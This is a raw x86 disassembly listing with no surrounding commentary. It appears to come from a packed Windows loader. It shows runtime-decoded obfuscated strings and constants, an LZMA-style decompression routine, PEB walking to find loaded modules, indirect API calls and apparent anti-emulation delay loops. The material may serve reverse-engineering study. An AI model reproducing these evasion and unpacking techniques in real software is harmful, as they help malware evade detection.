  41214d:	mov    esi,DWORD PTR [ebp-0x2c]
  412150:	cmp    esi,eax
  412152:	jne    0x412162
  412154:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41215b:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  412162:	mov    eax,DWORD PTR [ebp-0x4]
  412165:	mov    eax,DWORD PTR [eax+0x18c]
  41216b:	cmp    DWORD PTR [eax],edi
  41216d:	jne    0x4123bf
  412173:	mov    eax,DWORD PTR [ebp-0x4]
  412176:	mov    eax,DWORD PTR [eax+0x17c]
  41217c:	mov    DWORD PTR [eax],edi
  41217e:	mov    eax,DWORD PTR [ebp-0x4]
  412181:	mov    eax,DWORD PTR [eax+0x180]
  412187:	mov    DWORD PTR [eax],edi
  412189:	mov    edi,0x4e3d
  41218e:	mov    eax,0x4f8e
  412193:	mov    WORD PTR [ebp-0x78],ax
  412197:	mov    eax,edi
  412199:	mov    WORD PTR [ebp-0x76],ax
  41219d:	add    eax,0x41
  4121a0:	mov    WORD PTR [ebp-0x74],ax
  4121a4:	lea    eax,[edi+0x1]
  4121a7:	mov    WORD PTR [ebp-0x72],ax
  4121ab:	mov    eax,0x4fad
  4121b0:	mov    WORD PTR [ebp-0x70],ax
  4121b4:	lea    eax,[edi-0xc]
  4121b7:	mov    WORD PTR [ebp-0x6e],ax
  4121bb:	add    eax,0x4b
  4121be:	mov    WORD PTR [ebp-0x6c],ax
  4121c2:	lea    eax,[edi-0xa]
  4121c5:	mov    WORD PTR [ebp-0x6a],ax
  4121c9:	mov    eax,edi
  4121cb:	mov    WORD PTR [ebp-0x68],ax
  4121cf:	add    eax,0xfffffff5
  4121d2:	mov    WORD PTR [ebp-0x66],ax
  4121d6:	mov    eax,0x99fe
  4121db:	mov    WORD PTR [ebp-0x64],ax
  4121df:	mov    eax,0x8281
  4121e4:	mov    WORD PTR [ebp-0x62],ax
  4121e8:	mov    eax,0xd78c
  4121ed:	mov    WORD PTR [ebp-0x60],ax
  4121f1:	add    eax,0x14
  4121f4:	mov    WORD PTR [ebp-0x5e],ax
  4121f8:	mov    eax,0x27a3
  4121fd:	mov    WORD PTR [ebp-0x5c],ax
  412201:	mov    eax,0x47a3
  412206:	mov    WORD PTR [ebp-0x5a],ax
  41220a:	lea    eax,[edi-0xd]
  41220d:	mov    WORD PTR [ebp-0x58],ax
  412211:	mov    DWORD PTR [ebp-0x10],0xf306020f
  412218:	mov    DWORD PTR [ebp-0xc],0x7a050a1d
  41221f:	lea    eax,[ebp-0x10]
  412222:	mov    bl,BYTE PTR [eax]
  412224:	xor    bl,dl
  412226:	sub    bl,0xb
  412229:	mov    BYTE PTR [eax],bl
  41222b:	inc    eax
  41222c:	dec    ecx
  41222d:	jne    0x412222
  41222f:	lea    eax,[ebp-0x10]
  412232:	mov    DWORD PTR [ebp-0xb8],eax
  412238:	lea    eax,[ebp-0xbc]
  41223e:	push   eax
  41223f:	mov    eax,DWORD PTR [ebp+0xc]
  412242:	mov    ebx,0x7510896
  412247:	xor    eax,ebx
  412249:	mov    esi,0x3272dd
  41224e:	add    eax,esi
  412250:	push   eax
  412251:	mov    eax,DWORD PTR [ebp-0x4]
  412254:	add    eax,0x66
  412257:	push   eax
  412258:	mov    eax,DWORD PTR [ebp-0x4]
  41225b:	mov    eax,DWORD PTR [eax+0x198]
  412261:	mov    DWORD PTR [ebp-0xbc],0x1
  41226b:	push   DWORD PTR [eax]
  41226d:	mov    eax,DWORD PTR [ebp+0x10]
  412270:	call   eax
  412272:	mov    ecx,DWORD PTR [ebp+0x8]
  412275:	xor    ecx,ebx
  412277:	add    ecx,esi
  412279:	mov    DWORD PTR [ebp-0x8],eax
  41227c:	cmp    eax,ecx
  41227e:	jne    0x412299
  412280:	mov    eax,ds:0x33730bec
  412285:	or     eax,0x22150bef
  41228a:	mov    ds:0x33730bec,eax
  41228f:	add    eax,0x3372e90f
  412294:	mov    ds:0x33730bec,eax
  412299:	mov    ecx,0x4f85
  41229e:	mov    eax,ecx
  4122a0:	mov    WORD PTR [ebp-0x40],ax
  4122a4:	add    eax,0x3
  4122a7:	mov    edx,eax
  4122a9:	mov    WORD PTR [ebp-0x3e],dx
  4122ad:	lea    edx,[ecx+0xb]
  4122b0:	mov    WORD PTR [ebp-0x3c],dx
  4122b4:	add    edx,0x18
  4122b7:	mov    WORD PTR [ebp-0x3a],dx
  4122bb:	lea    edx,[ecx+0x25]
  4122be:	mov    WORD PTR [ebp-0x38],dx
  4122c2:	add    edx,0x5
  4122c5:	mov    WORD PTR [ebp-0x36],dx
  4122c9:	lea    edx,[ecx+0x1f]
  4122cc:	mov    WORD PTR [ebp-0x34],dx
  4122d0:	mov    WORD PTR [ebp-0x32],cx
  4122d4:	mov    ecx,edi
  4122d6:	mov    WORD PTR [ebp-0x30],cx
  4122da:	lea    ecx,[edx+0x1]
  4122dd:	mov    edx,ecx
  4122df:	mov    WORD PTR [ebp-0x54],dx
  4122e3:	mov    edx,eax
  4122e5:	mov    WORD PTR [ebp-0x52],dx
  4122e9:	mov    edx,0x4e70
  4122ee:	mov    WORD PTR [ebp-0x50],dx
  4122f2:	mov    WORD PTR [ebp-0x4e],ax
  4122f6:	lea    eax,[ecx-0x1b]
  4122f9:	mov    WORD PTR [ebp-0x4c],ax
  4122fd:	add    eax,0x5
  412300:	mov    WORD PTR [ebp-0x4a],ax
  412304:	lea    eax,[ecx-0x21]
  412307:	mov    WORD PTR [ebp-0x48],ax
  41230b:	mov    WORD PTR [ebp-0x46],cx
  41230f:	mov    WORD PTR [ebp-0x44],di
  412313:	mov    eax,DWORD PTR [ebp+0x8]
  412316:	movzx  ecx,WORD PTR [ebp-0x54]
  41231a:	xor    eax,ebx
  41231c:	add    eax,esi
  41231e:	xor    eax,ecx
  412320:	mov    WORD PTR [ebp-0x54],ax
  412324:	mov    eax,DWORD PTR [ebp+0x8]
  412327:	movzx  ecx,WORD PTR [ebp-0x40]
  41232b:	xor    eax,ebx
  41232d:	add    eax,esi
  41232f:	xor    eax,ecx
  412331:	mov    WORD PTR [ebp-0x40],ax
  412335:	xor    eax,eax
  412337:	mov    WORD PTR [ebp-0xd0],ax
  41233e:	mov    WORD PTR [ebp-0xe4],ax
  412345:	mov    edi,DWORD PTR [ebp+0x24]
  412348:	lea    eax,[ebp-0xd0]
  41234e:	lea    edx,[ebp-0x54]
  412351:	mov    DWORD PTR [ebp-0xbc],0x2
  41235b:	mov    DWORD PTR [ebp-0xb8],eax
  412361:	call   0x414b33
  412366:	mov    DWORD PTR [ebp-0xb4],eax
  41236c:	lea    eax,[ebp-0xbc]
  412372:	push   eax
  412373:	mov    eax,DWORD PTR [ebp+0xc]
  412376:	xor    eax,ebx
  412378:	add    eax,esi
  41237a:	push   eax
  41237b:	lea    eax,[ebp-0x78]
  41237e:	push   eax
  41237f:	push   DWORD PTR [ebp-0x8]
  412382:	mov    eax,DWORD PTR [ebp+0x10]
  412385:	call   eax
  412387:	mov    edi,DWORD PTR [ebp+0x24]
  41238a:	lea    eax,[ebp-0xe4]
  412390:	lea    edx,[ebp-0x40]
  412393:	mov    DWORD PTR [ebp-0xb8],eax
  412399:	call   0x414b33
  41239e:	mov    DWORD PTR [ebp-0xb4],eax
  4123a4:	lea    eax,[ebp-0xbc]
  4123aa:	push   eax
  4123ab:	mov    eax,DWORD PTR [ebp+0xc]
  4123ae:	xor    eax,ebx
  4123b0:	add    eax,esi
  4123b2:	push   eax
  4123b3:	lea    eax,[ebp-0x78]
  4123b6:	push   eax
  4123b7:	push   DWORD PTR [ebp-0x8]
  4123ba:	mov    eax,DWORD PTR [ebp+0x10]
  4123bd:	call   eax
  4123bf:	mov    eax,DWORD PTR [ebp+0x14]
  4123c2:	push   DWORD PTR [ebp-0x4]
  4123c5:	push   DWORD PTR [ebp+0x20]
  4123c8:	push   DWORD PTR [ebp+0x1c]
  4123cb:	push   DWORD PTR [ebp+0x18]
  4123ce:	push   DWORD PTR [ebp+0x10]
  4123d1:	push   DWORD PTR [ebp+0x8]
  4123d4:	push   DWORD PTR [ebp+0xc]
  4123d7:	call   0x4133d7
  4123dc:	add    DWORD PTR [ebp-0x4],eax
  4123df:	mov    eax,DWORD PTR [ebp-0x4]
  4123e2:	mov    eax,DWORD PTR [ebp-0x4]
  4123e5:	mov    edi,DWORD PTR [eax+0x190]
  4123eb:	mov    eax,DWORD PTR [ebp-0x4]
  4123ee:	mov    eax,DWORD PTR [eax+0x18c]
  4123f4:	mov    esi,DWORD PTR [eax]
  4123f6:	lea    ecx,[ebp+0x4]
  4123f9:	mov    edx,DWORD PTR [ecx]
  4123fb:	cmp    edx,esi
  4123fd:	jb     0x412414
  4123ff:	mov    eax,DWORD PTR [edi]
  412401:	mov    edi,DWORD PTR [eax+0x3c]
  412404:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  412408:	add    edi,esi
  41240a:	cmp    edx,edi
  41240c:	jae    0x412414
  41240e:	sub    eax,esi
  412410:	add    eax,edx
  412412:	mov    DWORD PTR [ecx],eax
  412414:	pop    edi
  412415:	pop    esi
  412416:	pop    ebx
  412417:	leave  
  412418:	ret    0x20
  41241b:	push   edi
  41241c:	push   esi
  41241d:	push   ebx
  41241e:	push   ebp
  41241f:	mov    ebp,esp
  412421:	mov    eax,DWORD PTR [ebp+0x24]
  412424:	add    DWORD PTR [ebp+0x28],eax
  412427:	push   eax
  412428:	cld    
  412429:	mov    esi,DWORD PTR [ebp+0x18]
  41242c:	add    DWORD PTR [ebp+0x1c],esi
  41242f:	push   esi
  412430:	mov    esi,DWORD PTR [ebp+0x14]
  412433:	lods   eax,DWORD PTR ds:[esi]
  412434:	xchg   edx,eax
  412435:	push   edx
  412436:	mov    cl,BYTE PTR [esi-0x2]
  412439:	or     eax,0xffffffff
  41243c:	shl    eax,cl
  41243e:	not    eax
  412440:	push   eax
  412441:	mov    cl,dh
  412443:	or     eax,0xffffffff
  412446:	shl    eax,cl
  412448:	not    eax
  41244a:	push   eax
  41244b:	add    cl,dl
  41244d:	mov    edi,esi
  41244f:	sub    esp,0xc
  412452:	sub    eax,eax
  412454:	inc    eax
  412455:	push   eax
  412456:	push   eax
  412457:	push   eax
  412458:	push   eax
  412459:	push   eax
  41245a:	push   edi
  41245b:	sub    esi,esi
  41245d:	push   esi
  41245e:	or     ebx,0xffffffff
  412461:	mov    eax,0x300
  412466:	shl    eax,cl
  412468:	lea    ecx,[eax+0x736]
  41246e:	mov    eax,0x4000400
  412473:	shr    ecx,1
  412475:	rep stos DWORD PTR es:[edi],eax
  412477:	push   0x5
  412479:	pop    ecx
  41247a:	call   0x412765
  41247f:	loop   0x41247a
  412481:	lea    esi,[esi]
  412483:	lea    edi,[edi]
  412485:	mov    edi,DWORD PTR [ebp-0x4]
  412488:	mov    eax,DWORD PTR [ebp-0x10]
  41248b:	sub    edi,DWORD PTR [ebp+0x24]
  41248e:	and    eax,edi
  412490:	mov    DWORD PTR [ebp-0x18],eax
  412493:	mov    al,0x0
  412495:	call   0x41277d
  41249a:	jne    0x412535
  4124a0:	mov    cl,BYTE PTR [ebp-0xc]
  4124a3:	and    edi,DWORD PTR [ebp-0x14]
  4124a6:	shl    edi,cl
  4124a8:	sub    cl,0x8
  4124ab:	neg    cl
  4124ad:	shr    esi,cl
  4124af:	pop    eax
  4124b0:	add    edi,esi
  4124b2:	pop    esi
  4124b3:	lea    edi,[edi+edi*2]
  4124b6:	shl    edi,0x8
  4124b9:	cmp    al,0x7
  4124bb:	pop    edx
  4124bc:	lea    ecx,[esi+edi*2+0xe6c]
  4124c3:	push   ecx
  4124c4:	push   esi
  4124c5:	mov    esi,0x100
  4124ca:	push   eax
  4124cb:	mov    al,0x1
  4124cd:	jb     0x412503
  4124cf:	mov    edi,DWORD PTR [ebp-0x4]
  4124d2:	sub    edi,DWORD PTR [ebp-0x24]
  4124d5:	movzx  edi,BYTE PTR [edi]
  4124d8:	mov    ebp,DWORD PTR [ebp-0x34]
  4124db:	shl    edi,1
  4124dd:	mov    ecx,esi
  4124df:	and    esi,edi
  4124e1:	add    ecx,esi
  4124e3:	lea    ebp,[ebp+ecx*2+0x0]
  4124e7:	call   0x41279c
  4124ec:	mov    ecx,eax
  4124ee:	shr    esi,0x8
  4124f1:	and    ecx,0x1
  4124f4:	cmp    esi,ecx
  4124f6:	mov    esi,0x100
  4124fb:	jne    0x41250b
  4124fd:	cmp    eax,esi
  4124ff:	jb     0x4124d8
  412501:	jmp    0x412517
  412503:	mov    ebp,DWORD PTR [ebp-0x34]
  412506:	call   0x41279c
  41250b:	inc    eax
  41250c:	inc    esi
  41250d:	sub    eax,0x1
  412510:	sub    esi,0x1
  412513:	cmp    eax,esi
  412515:	jb     0x412503
  412517:	pop    edx
  412518:	inc    edx
  412519:	cmp    edx,0x5
  41251c:	dec    edx
  41251d:	mov    ecx,edx
  41251f:	jb     0x412530
  412521:	inc    edx
  412522:	cmp    edx,0xb
  412525:	dec    edx
  412526:	mov    cl,0x4
  412528:	dec    cl
  41252a:	jb     0x412530
  41252c:	mov    cl,0x7
  41252e:	dec    cl
  412530:	sub    edx,ecx
  412532:	push   edx
  412533:	jmp    0x412584
  412535:	mov    al,0xc1
  412537:	dec    al
  412539:	call   0x41278d
  41253e:	jne    0x412554
  412540:	pop    eax
  412541:	pop    edi
  412542:	pop    edx
  412543:	pop    ecx
  412544:	pop    edx
  412545:	pop    ecx
  412546:	push   DWORD PTR [esp]
  412549:	push   ecx
  41254a:	push   edx
  41254b:	mov    edx,0x664
  412550:	mov    cl,0x0
  412552:	jmp    0x4125c7
  412554:	mov    al,0xcd
  412556:	dec    al
  412558:	call   0x41278d
  41255d:	jne    0x41258d
  41255f:	mov    al,0xf1
  412561:	dec    al
  412563:	call   0x41277d
  412568:	jne    0x4125bd
  41256a:	pop    eax
  41256b:	cmp    al,0x7
  41256d:	mov    al,0x9
  41256f:	jb     0x412573
  412571:	mov    al,0xb
  412573:	push   eax
  412574:	mov    esi,DWORD PTR [ebp-0x4]
  412577:	sub    esi,DWORD PTR [ebp-0x24]
  41257a:	cmp    esi,DWORD PTR [ebp+0x24]
  41257d:	jb     0x412754
  412583:	lods   al,BYTE PTR ds:[esi]
  412584:	mov    edi,DWORD PTR [ebp-0x4]
  412587:	stos   BYTE PTR es:[edi],al
  412588:	jmp    0x41271b
  41258d:	mov    al,0xd8
  41258f:	call   0x41278d
  412594:	mov    esi,DWORD PTR [ebp-0x28]
  412597:	je     0x4125b4
  412599:	mov    al,0xe4
  41259b:	call   0x41278d
  4125a0:	mov    esi,DWORD PTR [ebp-0x2c]
  4125a3:	je     0x4125ae
  4125a5:	mov    esi,DWORD PTR [ebp-0x30]
  4125a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4125ab:	mov    DWORD PTR [ebp-0x30],ecx
  4125ae:	mov    ecx,DWORD PTR [ebp-0x28]
  4125b1:	mov    DWORD PTR [ebp-0x2c],ecx
  4125b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4125b7:	mov    DWORD PTR [ebp-0x28],ecx
  4125ba:	mov    DWORD PTR [ebp-0x24],esi
  4125bd:	pop    eax
  4125be:	pop    edi
  4125bf:	pop    ecx
  4125c0:	mov    edx,0xa68
  4125c5:	mov    cl,0x8
  4125c7:	add    edx,edi
  4125c9:	push   edx
  4125ca:	push   edi
  4125cb:	cmp    al,0x7
  4125cd:	mov    al,cl
  4125cf:	jb     0x4125d3
  4125d1:	add    al,0x3
  4125d3:	push   eax
  4125d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4125d7:	call   0x41279a
  4125dc:	jne    0x4125f2
  4125de:	mov    eax,DWORD PTR [ebp-0x18]
  4125e1:	mov    edi,DWORD PTR [ebp-0x34]
  4125e4:	shl    eax,0x3
  4125e7:	sub    ecx,ecx
  4125e9:	push   0x8
  4125eb:	pop    esi
  4125ec:	lea    edi,[edi+eax*2+0x4]
  4125f0:	jmp    0x412627
  4125f2:	mov    ebp,DWORD PTR [ebp-0x34]
  4125f5:	add    ebp,0x2
  4125f8:	call   0x41279a
  4125fd:	jne    0x412617
  4125ff:	mov    eax,DWORD PTR [ebp-0x18]
  412602:	mov    edi,DWORD PTR [ebp-0x34]
  412605:	shl    eax,0x3
  412608:	push   0x8
  41260a:	pop    ecx
  41260b:	push   0x8
  41260d:	pop    esi
  41260e:	lea    edi,[edi+eax*2+0x104]
  412615:	jmp    0x412627
  412617:	mov    edi,0x204
  41261c:	add    edi,DWORD PTR [ebp-0x34]
  41261f:	push   0x10
  412621:	pop    ecx
  412622:	mov    esi,0x100
  412627:	mov    DWORD PTR [ebp-0x1c],ecx
  41262a:	sub    eax,eax
  41262c:	inc    eax
  41262d:	mov    ebp,edi
  41262f:	call   0x41279c
  412634:	mov    ecx,eax
  412636:	sub    ecx,esi
  412638:	jb     0x41262d
  41263a:	add    DWORD PTR [ebp-0x1c],ecx
  41263d:	cmp    DWORD PTR [ebp-0x3c],0x4
  412641:	jae    0x4126f7
  412647:	add    DWORD PTR [ebp-0x3c],0x7
  41264b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41264e:	cmp    ecx,0x4
  412651:	jb     0x412656
  412653:	push   0x3
  412655:	pop    ecx
  412656:	mov    edi,DWORD PTR [ebp-0x38]
  412659:	shl    ecx,0x6
  41265c:	sub    eax,eax
  41265e:	inc    eax
  41265f:	push   0x40
  412661:	pop    esi
  412662:	lea    edi,[edi+ecx*2+0x360]
  412669:	mov    ebp,edi
  41266b:	call   0x41279c
  412670:	mov    ecx,eax
  412672:	sub    ecx,esi
  412674:	jb     0x412669
  412676:	mov    DWORD PTR [ebp-0x18],ecx
  412679:	mov    DWORD PTR [ebp-0x24],ecx
  41267c:	cmp    ecx,0x4
  41267f:	jb     0x4126f4
  412681:	mov    esi,ecx
  412683:	and    DWORD PTR [ebp-0x24],0x1
  412687:	shr    esi,1
  412689:	or     DWORD PTR [ebp-0x24],0x2
  41268d:	dec    esi
  41268e:	cmp    ecx,0xe
  412691:	jae    0x4126ac
  412693:	mov    eax,0x2af
  412698:	sub    eax,ecx
  41269a:	mov    ecx,esi
  41269c:	shl    BYTE PTR [ebp-0x24],cl
  41269f:	add    eax,DWORD PTR [ebp-0x24]
  4126a2:	shl    eax,1
  4126a4:	add    eax,DWORD PTR [ebp-0x38]
  4126a7:	mov    DWORD PTR [ebp-0x34],eax
  4126aa:	jmp    0x4126d9
  4126ac:	sub    esi,0x4
  4126af:	call   0x412759
  4126b4:	shr    ebx,1
  4126b6:	shl    DWORD PTR [ebp-0x24],1
  4126b9:	cmp    DWORD PTR [ebp-0x20],ebx
  4126bc:	jb     0x4126c4
  4126be:	inc    DWORD PTR [ebp-0x24]
  4126c1:	sub    DWORD PTR [ebp-0x20],ebx
  4126c4:	dec    esi
  4126c5:	jne    0x4126af
  4126c7:	mov    eax,0x644
  4126cc:	add    eax,DWORD PTR [ebp-0x38]
  4126cf:	mov    DWORD PTR [ebp-0x34],eax
  4126d2:	shl    DWORD PTR [ebp-0x24],0x4
  4126d6:	push   0x4
  4126d8:	pop    esi
  4126d9:	sub    edi,edi
  4126db:	inc    edi
  4126dc:	mov    eax,edi
  4126de:	mov    ebp,DWORD PTR [ebp-0x34]
  4126e1:	call   0x41279c
  4126e6:	test   al,0x1
  4126e8:	je     0x4126ed
  4126ea:	or     DWORD PTR [ebp-0x24],edi
  4126ed:	shl    edi,1
  4126ef:	dec    esi
  4126f0:	jne    0x4126de
  4126f2:	jmp    0x4126f4
  4126f4:	inc    DWORD PTR [ebp-0x24]
  4126f7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4126fa:	add    ecx,0x2
  4126fd:	mov    edi,DWORD PTR [ebp-0x4]
  412700:	mov    eax,edi
  412702:	sub    eax,DWORD PTR [ebp+0x24]
  412705:	cmp    DWORD PTR [ebp-0x24],eax
  412708:	ja     0x412754
  41270a:	mov    esi,edi
  41270c:	sub    esi,DWORD PTR [ebp-0x24]
  41270f:	mov    edx,DWORD PTR [ebp+0x28]
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	stos   BYTE PTR es:[edi],al
  412714:	cmp    edi,edx
  412716:	jae    0x41271b
  412718:	dec    ecx
  412719:	jne    0x412712
  41271b:	mov    DWORD PTR [ebp-0x4],edi
  41271e:	movzx  esi,al
  412721:	cmp    edi,DWORD PTR [ebp+0x28]
  412724:	jb     0x412485
  41272a:	call   0x412759
  41272f:	sub    eax,eax
  412731:	lea    ebp,[esp+0x3c]
  412735:	mov    edx,DWORD PTR [ebp+0x20]
  412738:	mov    esi,DWORD PTR [ebp-0x8]
  41273b:	sub    esi,DWORD PTR [ebp+0x18]
  41273e:	mov    DWORD PTR [edx],esi
  412740:	mov    edx,DWORD PTR [ebp+0x2c]
  412743:	mov    edi,DWORD PTR [ebp-0x4]
  412746:	sub    edi,DWORD PTR [ebp+0x24]
  412749:	mov    DWORD PTR [edx],edi
  41274b:	leave  
  41274c:	pop    ebx
  41274d:	pop    esi
  41274e:	pop    edi
  41274f:	ret    0x1c
  412752:	pop    esi
  412753:	pop    eax
  412754:	sub    eax,eax
  412756:	inc    eax
  412757:	jmp    0x412731
  412759:	cmp    ebx,0x1000000
  41275f:	jb     0x412762
  412761:	ret    
  412762:	shl    ebx,0x8
  412765:	push   esi
  412766:	mov    esi,DWORD PTR [ebp-0x8]
  412769:	cmp    esi,DWORD PTR [ebp+0x1c]
  41276c:	jae    0x412752
  41276e:	mov    eax,DWORD PTR [ebp-0x20]
  412771:	shl    eax,0x8
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	mov    DWORD PTR [ebp-0x20],eax
  412778:	mov    DWORD PTR [ebp-0x8],esi
  41277b:	pop    esi
  41277c:	ret    
  41277d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412780:	movzx  eax,al
  412783:	shl    ecx,0x4
  412786:	add    eax,DWORD PTR [ebp-0x18]
  412789:	add    eax,ecx
  41278b:	jmp    0x412793
  41278d:	movzx  eax,al
  412790:	add    eax,DWORD PTR [ebp-0x3c]
  412793:	mov    ebp,DWORD PTR [ebp-0x38]
  412796:	lea    ebp,[ebp+eax*2+0x0]
  41279a:	sub    eax,eax
  41279c:	lea    ebp,[ebp+eax*2+0x0]
  4127a0:	cmp    ebx,0x1000000
  4127a6:	jae    0x4127c4
  4127a8:	mov    ecx,DWORD PTR [esp+0x38]
  4127ac:	shl    DWORD PTR [esp+0x20],0x8
  4127b1:	cmp    ecx,DWORD PTR [esp+0x5c]
  4127b5:	jae    0x412753
  4127b7:	mov    dl,BYTE PTR [ecx]
  4127b9:	inc    DWORD PTR [esp+0x38]
  4127bd:	shl    ebx,0x8
  4127c0:	mov    BYTE PTR [esp+0x20],dl
  4127c4:	mov    ecx,ebx
  4127c6:	movzx  edx,WORD PTR [ebp+0x0]
  4127ca:	shr    ecx,0xb
  4127cd:	imul   ecx,edx
  4127d0:	cmp    DWORD PTR [esp+0x20],ecx
  4127d4:	jae    0x4127ed
  4127d6:	mov    ebx,ecx
  4127d8:	mov    ecx,0x800
  4127dd:	sub    ecx,edx
  4127df:	shr    ecx,0x5
  4127e2:	add    WORD PTR [ebp+0x0],cx
  4127e6:	add    eax,eax
  4127e8:	lea    ebp,[esp+0x40]
  4127ec:	ret    
  4127ed:	shr    edx,0x5
  4127f0:	sub    DWORD PTR [esp+0x20],ecx
  4127f4:	sub    ebx,ecx
  4127f6:	sub    WORD PTR [ebp+0x0],dx
  4127fa:	add    eax,eax
  4127fc:	add    eax,0x1
  4127ff:	lea    ebp,[esp+0x40]
  412803:	ret    
  412804:	push   ebp
  412805:	mov    ebp,esp
  412807:	sub    esp,0xec
  41280d:	push   ebx
  41280e:	push   esi
  41280f:	push   edi
  412810:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  412817:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  41281e:	mov    eax,DWORD PTR [ebp+0x8]
  412821:	mov    DWORD PTR [ebp+0x8],eax
  412824:	mov    ecx,DWORD PTR [ebp-0x8]
  412827:	mov    ebx,0x7510896
  41282c:	xor    ecx,ebx
  41282e:	mov    eax,0x3272dd
  412833:	add    ecx,eax
  412835:	mov    DWORD PTR [ebp-0x20],ecx
  412838:	mov    ecx,DWORD PTR [ebp-0x8]
  41283b:	xor    ecx,ebx
  41283d:	add    ecx,eax
  41283f:	mov    DWORD PTR [ebp-0x30],ecx
  412842:	mov    ecx,DWORD PTR [ebp-0x8]
  412845:	xor    ecx,ebx
  412847:	add    ecx,eax
  412849:	mov    DWORD PTR [ebp-0x2c],ecx
  41284c:	mov    ecx,DWORD PTR [ebp-0x8]
  41284f:	xor    ecx,ebx
  412851:	add    ecx,eax
  412853:	mov    DWORD PTR [ebp-0xa0],ecx
  412859:	mov    DWORD PTR [ebp-0x48],0xf89f05b5
  412860:	mov    DWORD PTR [ebp-0x2c],0xf89cb5b5
  412867:	mov    DWORD PTR [ebp-0x3c],0xf89c85b1
  41286e:	push   0x24
  412870:	pop    ecx
  412871:	mov    DWORD PTR [ebp-0x28],ecx
  412874:	mov    DWORD PTR [ebp-0x28],ecx
  412877:	push   0x64
  412879:	pop    ecx
  41287a:	mov    DWORD PTR [ebp-0x28],ecx
  41287d:	mov    DWORD PTR [ebp-0x28],ecx
  412880:	mov    DWORD PTR [ebp-0x28],0x4c
  412887:	mov    DWORD PTR [ebp-0x28],0x42
  41288e:	mov    ecx,DWORD PTR [ebp-0x8]
  412891:	xor    ecx,ebx
  412893:	add    ecx,eax
  412895:	mov    DWORD PTR [ebp-0x28],ecx
  412898:	mov    ecx,DWORD PTR [ebp-0x8]
  41289b:	xor    ecx,ebx
  41289d:	add    ecx,eax
  41289f:	mov    DWORD PTR [ebp-0x28],ecx
  4128a2:	mov    DWORD PTR [ebp-0x24],0x256
  4128a9:	mov    DWORD PTR [ebp-0x1c],0x34
  4128b0:	mov    DWORD PTR [ebp-0xc],0x78
  4128b7:	lea    edi,[ebp-0xcc]
  4128bd:	lea    esi,[ebp-0xec]
  4128c3:	call   0x413346
  4128c8:	dec    DWORD PTR [ebp-0xc]
  4128cb:	jne    0x4128b7
  4128cd:	dec    DWORD PTR [ebp-0x1c]
  4128d0:	jne    0x4128b0
  4128d2:	dec    DWORD PTR [ebp-0x24]
  4128d5:	jne    0x4128a9
  4128d7:	mov    DWORD PTR [ebp-0x1c],0x400c
  4128de:	mov    eax,DWORD PTR [ebp-0x8]
  4128e1:	xor    eax,ebx
  4128e3:	mov    esi,0x3272dd
  4128e8:	add    eax,esi
  4128ea:	mov    DWORD PTR [ebp-0x14],eax
  4128ed:	mov    eax,DWORD PTR [ebp-0x8]
  4128f0:	and    DWORD PTR [ebp-0x8c],0x0
  4128f7:	xor    eax,ebx
  4128f9:	add    eax,esi
  4128fb:	mov    DWORD PTR [ebp-0x24],eax
  4128fe:	mov    eax,fs:0x18
  412904:	mov    DWORD PTR [ebp-0x8c],eax
  41290a:	mov    eax,DWORD PTR [eax+0x30]
  41290d:	mov    DWORD PTR [ebp-0x90],eax
  412913:	mov    eax,DWORD PTR [eax+0xc]
  412916:	mov    DWORD PTR [ebp-0x9c],eax
  41291c:	mov    eax,DWORD PTR [ebp+0x8]
  41291f:	lea    ecx,[ebp-0x8c]
  412925:	mov    DWORD PTR [eax+0x1a0],ecx
  41292b:	mov    eax,DWORD PTR [ebp+0x8]
  41292e:	lea    ecx,[ebp-0x90]
  412934:	mov    DWORD PTR [eax+0x1a4],ecx
  41293a:	mov    eax,DWORD PTR [ebp+0x8]
  41293d:	push   DWORD PTR [ebp+0x8]
  412940:	lea    ecx,[ebp-0x9c]
  412946:	mov    DWORD PTR [eax+0x1a8],ecx
  41294c:	call   0x414b04
  412951:	mov    ecx,DWORD PTR [ebp-0x8]
  412954:	xor    ecx,ebx
  412956:	add    ecx,esi
  412958:	cmp    ecx,eax
  41295a:	je     0x412c2e
  412960:	mov    eax,DWORD PTR [ebp+0x8]
  412963:	mov    eax,DWORD PTR [eax+0x194]
  412969:	mov    ecx,DWORD PTR [eax]
  41296b:	mov    eax,DWORD PTR [ebp+0x8]
  41296e:	mov    eax,DWORD PTR [eax+0x194]
  412974:	mov    eax,DWORD PTR [eax]
  412976:	add    eax,DWORD PTR [ecx+0x3c]
  412979:	mov    ecx,DWORD PTR [ebp+0x8]
  41297c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  412982:	lea    edx,[ebp-0xac]
  412988:	push   edx
  412989:	mov    edx,DWORD PTR [ebp+0x8]
  41298c:	mov    edx,DWORD PTR [edx+0x18c]
  412992:	mov    edx,DWORD PTR [edx]
  412994:	add    edx,DWORD PTR [eax+0x88]
  41299a:	push   0x4
  41299c:	push   DWORD PTR [eax+0x8c]
  4129a2:	push   edx
  4129a3:	call   DWORD PTR [ecx+0x1c]
  4129a6:	push   DWORD PTR [ebp+0x8]
  4129a9:	mov    edi,DWORD PTR [ebp+0x8]
  4129ac:	mov    eax,DWORD PTR [ebp+0x8]
  4129af:	mov    edx,DWORD PTR [eax+0x1b8]
  4129b5:	mov    DWORD PTR [ebp-0x5c],0xc0e0f06
  4129bc:	mov    DWORD PTR [ebp-0x58],0x50a091f
  4129c3:	mov    WORD PTR [ebp-0x54],0x7a3d
  4129c9:	mov    DWORD PTR [ebp-0x70],0x23f0f25
  4129d0:	mov    DWORD PTR [ebp-0x6c],0x63d0c1d
  4129d7:	mov    DWORD PTR [ebp-0x68],0x281d020a
  4129de:	mov    DWORD PTR [ebp-0x64],0xc0109f1
  4129e5:	mov    DWORD PTR [ebp-0x60],0x7a3d1f05
  4129ec:	mov    DWORD PTR [ebp-0x84],0x23f0f25
  4129f6:	mov    DWORD PTR [ebp-0x80],0x63d0c1d
  4129fd:	mov    DWORD PTR [ebp-0x7c],0x281d020a
